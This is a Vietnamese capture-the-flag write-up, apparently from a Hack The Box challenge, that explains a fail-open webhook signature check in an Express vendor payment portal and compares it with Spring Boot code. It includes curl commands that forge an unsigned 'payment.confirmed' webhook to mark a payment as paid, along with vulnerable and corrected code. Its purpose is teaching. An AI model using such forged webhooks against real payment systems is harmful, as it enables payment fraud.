Bài viết giả định bạn là lập trình viên Java Spring Boot, chưa chuyên sâu bảo mật. App mục tiêu viết bằng Node.js/Express, nhưng mọi khái niệm đều có hộp "tương đồng Spring Boot" để bạn bám theo quen thuộc.

Phần 0 — Kiến thức nền cần có trước khi bắt đầu

0.1 — Webhook là gì?

Webhook là callback HTTP do server của bên thứ ba gọi ngược lại app của mình để báo một sự kiện đã xảy ra. Ví dụ cổ điển: app bạn dùng cổng Stripe; khi khách trả tiền xong, Stripe chủ động POST một request về https://app-cua-ban.com/webhooks/payment để báo "đã thu tiền". App bạn nghe webhook đó rồi mở khoá tài khoản khách.

Điểm nguy hiểm: bất kỳ ai cũng có thể POST tới endpoint đó. Nếu không kiểm tra ngường gọi có thật sự là Stripe không, kẻ tấn công tự POST một cái "đã thu tiền" giả là xong.

☕ Tương đồng Spring Boot

Giống hệt một @RestController với @PostMapping("/webhooks/payment") mà bạn mở ra công internet. Vấn đề bảo mật nằm ở chỗ: controller này không yêu cầu đăng nhập (vì Stripe không có account trong hệ thống bạn), nên phải xác thực bằng cách khác — thường là chữ ký HMAC.

0.2 — Xác thực webhook bằng HMAC signature

Cách chuẩn: hai bên chia sẻ một secret (chuỗi bí mật). Bên gửi (Stripe) tính HMAC-SHA256(secret, rawBody) và gửi kèm trong header, ví dụ X-Signature: <hex>. Bên nhận tự tính lại và so khớp. Kẻ tấn công không biết secret thì không tạo được chữ ký hợp lệ.

Hai chi tiết quan trọng cho bài này:

  • Phải ký trên raw body (chuỗi byte nguyên vẹn của request), không phải object đã parse — vì parse JSON có thể thay đổi thứ tự key, khiến chuỗi ký lại khác đi. Trong Express, middleware express.json() có option verify cho phép chộp raw body trước khi parse.
  • So khớp phải đúng cách. So sánh chuỗi thường bằng === lộ thời gian phản hồi qua kênh kề (timing attack), nên dùng hàm so khớp không rò rỉ thời gian như crypto.timingSafeEqual. App mục tiêu làm đúng chỗ này — lỗi nằm ở chỗ khác.
☕ Tương đồng Spring Boot

Tương đương viết một Filter trước controller đọc request.getInputStream() (raw body), rồi HmacUtils.hmacSha256Hex(secret, body) và so với header X-Signature.

✔ Cách verify: đây là khái niệm, không có lệnh. Ghi nhớ: chữ ký HMAC chỉ an toàn khi luôn luôn được bắt buộc — câu này sẽ là chìa khoá của Phần 3.

0.3 — "Fail-open" vs "fail-closed"

Hai kiểu xử lý khi kiểm tra bảo mật thất bại hoặc không chạy được:

  • Fail-closed (đúng): nghi ngờ → từ chối. Không có chữ ký → 401. Chữ ký sai → 401.
  • Fail-open (sai): "à, không có chữ ký thì chắc bên gửi không dùng chế độ bảo mật, cứ cho qua". Đây chính xác là lỗi của bài này.
☕ Tương đồng Spring Boot

Như viết if (signature != null) { kiểmTra(); } trong filter rồi để request đi tiếp khi signature == null — thay vì if (signature == null || !hợpLệ) { trả 401; return; }.

Phần 1 — Recon: vẽ bản đồ luồng thanh toán

Triết lý: khai thác webhook mà không biết app kỳ vọng payload gì thì chỉ là bắn mò. Ta thu thập đủ: luồng nghiệp vụ, các ID hệ thống sinh ra, và (rất may) toàn bộ source code.

1.1 — Mở trang chủ, nhận diện stack

# xem headers + body trang chủ
curl -s -i http://<host>:<port>/ | head -20

Phản hồi tiêu biểu:

HTTP/1.1 200 OK
X-Powered-By: Express          # server là Node.js + Express
Content-Type: text/html; charset=utf-8

Trang chủ là cổng "GOV.NOR Vendor Portal" với 3 đường link: /vendor/register, /vendor/sign-in, /vendor/payment/status. Thông điệp chính: vendor phải trả phí đăng ký 149 EUR thì tài khoản mới được kích hoạt, nhưng nút thanh toán bị disable vì "Payment service maintenance" — tức kênh trả tiền hợp lệ đã bị khoá, phải tìm đường khác xác nhận thanh toán.

✔ Cách verify: status 200, header X-Powered-By: Express, trong HTML có chuỗi Pay registration fee (149 EUR) và nút disabled.

1.2 — Đăng ký vendor, thu thập ID hệ thống

# đăng ký tài khoản vendor mới, lưu cookie vào file cj.txt
curl -s -c cj.txt -X POST http://<host>:<port>/vendor/register \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'name=Acme&email=acme123@test.com&password=password123'

Trang trả về "Vendor account" với bảng summary chứa 2 ID rất quan trọng:

Payment ID  : pay_031cab9a1594
Lưu ý: mỗi lần đăng ký, server sinh ID ngẫu nhiên khác nhau (phần sau ven_/pay_ là 12 ký tự hex ngẫu nhiên). Các lệnh tiếp theo của bạn phải dùng ID do phiên của bạn sinh ra, không dùng số trong bài viết này.
✔ Cách verify: response 200, trong HTML xuất hiện PENDING_ACTIVATION và một pay_... — ghi lại payment ID này, bước 1.3 dùng ngay.

1.3 — Kiểm tra trạng thái payment

Kết quả: Status: PENDING, kèm câu "Vendor account remains locked". Đây là mục tiêu cần đổi thành PAID.

✔ Cách verify: HTML có chuỗi PENDING và không có chữ Flag. (So sánh chéo với Phần 4: lúc đó cùng một URL sẽ có thêm khối flag.)

Challenge này có file đính kèm (nút download trên portal HTB). Giải nén được cây thư mục Checkout/ với app.js, controllers/webhook.js, controllers/payment.js, models.js, config.js. Đây là tài liệu quan trọng nhất của bài — ta không phải đoán endpoint nữa, đọc code là thấy hết.

Phần 2 — Các hướng tấn công trực diện (thất bại, và cách verify)

Ghi lại để bạn khỏi mất thời gian đi lại các đường cùng — và để thấy vì sao phải đọc kỹ source thay vì chỉ fuzz mò.

THẤT BẠI Đoán vị trí endpoint webhook bằng fuzz từ điển

Trước khi có source, ta thử đoán các path thông dụng:

# thử các đường mòn phổ biến — tất cả đều 404
for p in webhook webhooks/payment/notify vendor/payment/webhook api/payments internal/webhook; do
  curl -s -o /dev/null -w "$p -> %{http_code}\n" -X POST http://<host>:<port>/$p \
    -H 'Content-Type: application/json' -d '{}'
done

Kết quả thật: toàn bộ trả 404 — kể cả /webhooks/payment/confirm cũng 404 với body {} (vì thiếu trường bắt buộc nó trả 400/404 khác, ta lúc đó chưa biết để phân biệt).

Kết luận: fuzz mò không đủ; cần đọc app.js trong source để lấy route chính xác. Sau khi có route thật, thử tiếp ở Phần 2.2.

THẤT BẠI Gửi webhook có kèm chữ ký giả

# gửi đúng payload nhưng kèm chữ ký bịa
curl -s -X POST http://<host>:<port>/webhooks/payment/confirm \
  -H 'Content-Type: application/json' \
  -H 'X-Signature: deadbeef' \
  -d '{"event":"payment.confirmed","status":"PAID","paymentId":"pay_031cab9a1594","confirmationRef":"X"}'

Kết quả thật: HTTP 400 — invalid signature.

Kết luận: khi chữ ký có tồn tại, app verify rất chặt (HMAC-SHA256 với secret 32 byte ngẫu nhiên sinh lúc khởi động — brute-force hay giả mạo đều bất khả thi). Đường này không đi được. Nhưng chính câu "khi chữ ký có tồn tại" gợi ý lỗi…

THẤT BẠI Gửi payload thiếu/sai trường bắt buộc

# các biến thể bị từ chối — dùng để mapping đầy đủ validate của app
{"event":"payment.failed", ...}              # -> 400 invalid event
{... "status":"FAILED"}                   # -> 400 invalid status
{... "paymentId":"pay_nonexistent"}     # -> 404 payment not found
{... (bỏ confirmationRef)}                # -> 400 invalid confirmation reference

Kết quả thật: từng biến thể bị chặn đúng như trên.

Kết luận: validate dữ liệu nghiệp vụ rất kỹ — muốn qua được phải gửi payload hoàn chỉnh với payment ID thật của mình. Điều này thu hẹp phạm vi còn đúng một câu hỏi: nhánh kiểm tra chữ ký.

Phần 3 — Đột phá: đọc nhánh kiểm tra chữ ký trong source

3.1 — Trích code kiểm tra chữ ký

Mở controllers/webhook.js, hàm then chốt là handlePaymentConfirmation:

function handlePaymentConfirmation(payload, signature, rawBody) {
  // ... validate event / status / paymentId / confirmationRef (rất chặt) ...

  if (signature) {                                    # <== CHÌA KHOÁ: chỉ verify KHI CÓ chữ ký
    if (!verifySignature(signature, rawBody || Buffer.from(""))) {
      return { statusCode: 400, message: "invalid signature" };
    }
    markPaid(payment.paymentId);
    return { statusCode: 200, message: "payment processed" };
  }

  markPaid(payment.paymentId);                 # <== KHÔNG có chữ ký: vẫn markPaid, fail-open!
  return { statusCode: 200, message: "payment processed" };
}

Và ở controller, header được đọc bằng req.get("X-Signature") — nếu request không gửi header này, signature là undefined, điều kiện if (signature) sai, và code rơi thẳng xuống nhánh markPaid không kiểm tra gì.

Đây là lỗi fail-open kinh điển: tác giả viết đúng cả việc lấy raw body, đúng cả timingSafeEqual, nhưng quên dòng "bắt buộc phải có chữ ký". Cứa "con tem" (signature) trong đề bài chính là chỗ này: tem có thể giả — hay thậm chí bỏ trống.

✔ Cách verify: phân tích tĩnh — đối chiếu Phần 2.2: khi gửi X-Signature: deadbeef (truthy) thì bị 400; khi không gửi header đó thì signature === undefined (falsy). Hai trạng thái này đi vào hai nhánh khác nhau của cùng một hàm — dự đoán: bỏ header sẽ thành công.

3.2 — Gửi webhook giả mạo, cố tình KHÔNG kèm chữ ký

Payload cần đủ 4 điều kiện đã mapping ở Phần 2.3: event đúng, status đúng, paymentId thật của bạn (bước 1.2), confirmationRef là chuỗi không rỗng. Chỉ thiếu mỗi header X-Signature.

# giả mạo thông báo "thanh toán thành công" — chú ý: KHÔNG có header X-Signature
curl -s -i -X POST http://<host>:<port>/webhooks/payment/confirm \
  -H 'Content-Type: application/json' \
  -d '{"event":"payment.confirmed","status":"PAID","paymentId":"pay_031cab9a1594","confirmationRef":"FORGED-1"}'

Phản hồi:

HTTP/1.1 200 OK

payment processed
✔ Cách verify: status 200 + body payment processed — khác hẳn 400 invalid signature của Phần 2.2 ở đúng một biến số (có/không header chữ ký). So sánh chéo hai lần gửi này chính là bằng chứng lỗi fail-open. Lần này server đã gọi markPaid — nhưng cần kiểm chứng bằng trạng thái thật ở Phần 4.

Phần 5 — Root cause qua góc nhìn Spring Boot

Lỗi không nằm ở thuật toán chữ ký — nó nằm ở điều kiện rẽ nhánh. Tác giả nghĩ "nếu có chữ ký thì kiểm tra", nhưng trong bảo mật đúng phải là "nếu thiếu chữ ký thì từ chối".

❌ Code bị sai (Express — bản gốc của challenge)
if (signature) {              // BUG: verify chỉ chạy khi header tồn tại
  if (!verifySignature(signature, rawBody)) {
    return res.status(400).send("invalid signature");
  }
  markPaid(paymentId);        // đường hợp lệ
  return ...
}
markPaid(paymentId);          // <== khách không mang chữ ký vẫn được phục vụ
✅ Code sửa (Express)
if (typeof signature !== "string" || !signature) {
  return res.status(401).send("missing signature");   // thiếu chữ ký = từ chối ngay
}
if (!verifySignature(signature, req.rawBody)) {
  return res.status(401).send("invalid signature");  // sai chữ ký = từ chối
}
markPaid(paymentId);
❌ Tương đồng Spring Boot — cách viết tương tự sẽ gặp ở Java
@PostMapping("/webhooks/payment/confirm")
public ResponseEntity<String> confirm(@RequestBody PaymentEvent event,
                                        @RequestHeader(value = "X-Signature", required = false) String signature,
                                        HttpServletRequest request) throws IOException {
    if (signature != null) {              // BUG y hệt: null header = bỏ qua verify
        String expected = HmacUtils.hmacSha256Hex(secret, request.getInputStream().readAllBytes());
        if (!MessageDigest.isEqual(expected.getBytes(), signature.getBytes())) {
            return ResponseEntity.status(401).body("invalid signature");
        }
    }
    paymentService.markPaid(event.paymentId());   // <== vẫn chạy khi signature == null
    return ResponseEntity.ok("payment processed");
}
✅ Cách viết đúng trong Spring Boot
public ResponseEntity<String> confirm(...,
                                        @RequestHeader("X-Signature") String signature,  // required = true mặc định:
                                        HttpServletRequest request) throws IOException {          // thiếu header -> 400 ngay, không vào method
    byte[] body = request.getInputStream().readAllBytes();   // đọc raw body TRƯỚC khi @RequestBody parse
    String expected = HmacUtils.hmacSha256Hex(secret, body);
    if (!MessageDigest.isEqual(expected.getBytes(), signature.getBytes())) {
        return ResponseEntity.status(401).body("invalid signature");
    }
    paymentService.markPaid(event.paymentId());
    return ResponseEntity.ok("payment processed");
}
Nguyên tắc rút ra: với mọi kiểm tra bảo mật, hãy viết điều kiện theo hướng whitelist — liệt kê trường hợp được phép, mọi thứ còn lại tự động rơi vào từ chối. Đừng viết theo hướng "nếu thấy dấu hiệu xấu thì chặn", vì bạn sẽ luôn quên vài dấu hiệu (như undefined).

Phần 6 — Bài học & checklist khi tự làm lại

  1. Source code kèm đề là tài liện số một. Một bài easy có thể giải hoàn toàn bằng đọc code — đừng fuzz mò tốn thời gian khi đề đã cho đáp án.
  2. Map validate trước khi tấn công. Gửi từng biến thể thiếu/sai một trường (Phần 2.3) để biết chính xác app kỳ vọng gì — payload giả mạo sau đó chỉ còn là điền form.
  3. Hai phản hồi khác nhau ở một biến số = dấu vết lỗi logic. 400 với chữ ký giả vs 200 không chữ ký là manh mối trực tiếp dẫn tới nhánh if (signature).
  4. Fail-open thường nằm ở điều kiện rẽ nhánh, không nằm ở thuật toán. App này dùng đúng cả timingSafeEqual lẫn raw body nhưng vẫn thủng vì một dòng if.
  5. Luôn kiểm chứng side-effect bằng đường độc lập. Webhook trả 200 chưa chắc đã đổi DB — phải đăng nhập lại thấy ACTIVE mới chắc (bước 4.1).
